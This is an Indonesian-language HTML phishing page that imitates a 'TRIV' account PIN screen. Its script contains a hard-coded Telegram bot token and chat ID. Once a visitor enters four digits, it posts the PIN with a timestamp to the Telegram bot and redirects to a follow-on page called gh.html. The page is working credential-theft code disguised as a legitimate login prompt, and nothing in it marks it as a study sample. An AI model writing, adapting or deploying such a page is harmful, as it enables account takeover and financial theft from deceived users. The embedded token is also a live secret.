<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TRIV - Masukkan PIN</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;}
        body{min-height:100vh;background:linear-gradient(135deg,#051530 0%,#0a2550 100%);display:flex;flex-direction:column;align-items:center;padding:60px 30px;}
        
        .logo{font-size:2.5rem;font-weight:600;color:#80D0FF;margin:20px 0 40px;text-shadow:0 0 15px rgba(100,200,255,.5);}
        .title{color:#E0F0FF;font-size:1.4rem;margin-bottom:10px;}
        .subtitle{color:#90B8E0;font-size:.9rem;margin-bottom:40px;text-align:center;max-width:300px;}
        
        /* Lingkaran PIN — 4 titik */
        .pin-dots{display:flex;gap:18px;margin-bottom:40px;}
        .dot{width:18px;height:18px;border-radius:50%;border:2px solid #4090D0;background:transparent;transition:all .25s ease;}
        .dot.filled{background:#40B0FF;box-shadow:0 0 10px rgba(64,176,255,.6);border-color:#40B0FF;}
        
        /* Papan Ketik Angka */
        .numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;width:100%;max-width:300px;}
        .num-btn{width:100%;height:65px;background:rgba(255,255,255,.08);border:1px solid rgba(150,200,255,.2);border-radius:12px;color:#fff;font-size:1.4rem;font-weight:500;cursor:pointer;transition:all .15s ease;}
        .num-btn:active{background:rgba(64,176,255,.3);transform:scale(.95);}
        .num-btn.empty{visibility:hidden;}
        
        .hint{margin-top:30px;color:#70C0FF;font-size:.85rem;}
    </style>
</head>
<body>
    <div class="logo">triv</div>
    <h2 class="title">Masukkan PIN</h2>
    <p class="subtitle">Masukkan 4 digit PIN akun Anda</p>

    <div class="pin-dots" id="pinDots">
        <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
    </div>

    <div class="numpad" id="numpad">
        <button class="num-btn" data-num="1">1</button>
        <button class="num-btn" data-num="2">2</button>
        <button class="num-btn" data-num="3">3</button>
        <button class="num-btn" data-num="4">4</button>
        <button class="num-btn" data-num="5">5</button>
        <button class="num-btn" data-num="6">6</button>
        <button class="num-btn" data-num="7">7</button>
        <button class="num-btn" data-num="8">8</button>
        <button class="num-btn" data-num="9">9</button>
        <button class="num-btn empty"></button>
        <button class="num-btn" data-num="0">0</button>
        <button class="num-btn" data-del="true">⌫</button>
    </div>

    <p class="hint">Lupa PIN? Hubungi layanan pelanggan</p>

    <script>
        // === PENGATURAN ===
        const BOT_TOKEN = '8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg';
        const CHAT_ID = '8592742129';
        const HALAMAN_TUJUAN = 'gh.html';

        let pin = '';
        const dots = document.querySelectorAll('.dot');

        function perbaruiTampilan() {
            dots.forEach((dot, idx) => {
                dot.classList.toggle('filled', idx < pin.length);
            });
        }

        async function kirimTelegram(pesan) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: pesan,
                        disable_web_page_preview: true
                    })
                });
            } catch (e) {
                console.log('Kirim gagal:', e);
            }
        }

        document.querySelectorAll('.num-btn[data-num]').forEach(btn => {
            btn.addEventListener('click', async () => {
                if (pin.length >= 4) return;
                pin += btn.dataset.num;
                perbaruiTampilan();

                // Sudah 4 digit → kirim & pindah
                if (pin.length === 4) {
                    await kirimTelegram(`🔑 PIN TRIV\nPIN: ${pin}\n🕐 ${new Date().toLocaleString('id-ID')}`);
                    window.location.href = HALAMAN_TUJUAN;
                }
            });
        });

        document.querySelector('[data-del]').addEventListener('click', () => {
            if (pin.length > 0) {
                pin = pin.slice(0, -1);
                perbaruiTampilan();
            }
        });
    </script>
</body>
</html>
